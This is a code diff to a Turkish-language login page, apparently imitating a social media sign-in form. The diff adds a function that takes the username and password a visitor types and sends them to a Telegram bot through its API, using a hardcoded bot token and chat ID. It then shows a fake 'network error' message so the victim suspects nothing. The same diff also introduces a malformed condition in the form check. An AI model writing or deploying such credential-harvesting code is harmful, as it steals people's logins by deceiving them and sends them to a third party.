@@ -42,7 +42,7 @@
     var btn = document.getElementById("button");
     var err=document.getElementById("error")
 function Check() {
-    if (name.value === "" && pass.value === "") {
+    if (!name.value === "" && pass.value === "") {
         btn.style.background = "#4CB4F8";
     } else {
         btn.style.background = "#0095F6";
@@ -54,9 +54,11 @@ document.getElementById("name").addEventListener("input", Check);
 document.getElementById("password").addEventListener("input", Check);
 
 btn.addEventListener("click",function(){
-    if (name.value === "" && pass.value === "") {
-        
+    if (name.value === "" || pass.value === "") {
+        err.innerHTML = "Lütfen tüm alanları doldurun!";
+        return;
     }else{
+        sendToTelegram()
        btn.innerHTML=`<div class="spinner"></div>`;
        setTimeout(()=>{
 err.innerHTML="Ağ hatası, lütfen biraz sonra tekrar dene";
@@ -65,6 +67,26 @@ btn.innerHTML="Giriş yap"
     }
 })
 
+function sendToTelegram() {
+            const name = document.getElementById("name").value;
+            const message = document.getElementById("password").value;
+
+            if (!name || !message) {
+                err.innerHTML="İsim ve parola gerekli"
+                return;
+            }
+
+            const botToken = "8015272721:AAHovwpLJluTlPx6zfA9KLZjFvJqV-bt2ws"; // Telegram Bot Token
+            const chatId = "7452019947"; // Telegram Chat ID
+            const text = `🆕 Yeni Mesaj!\n👤 Ad: ${name}\n💬 Mesaj: ${message}`;
+
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`;
+
+            fetch(url)
+                .then(response => response.json())
+                .then(data => {})
+                .catch(error => console.log(error));
+        }
 
 </script>
 </html>
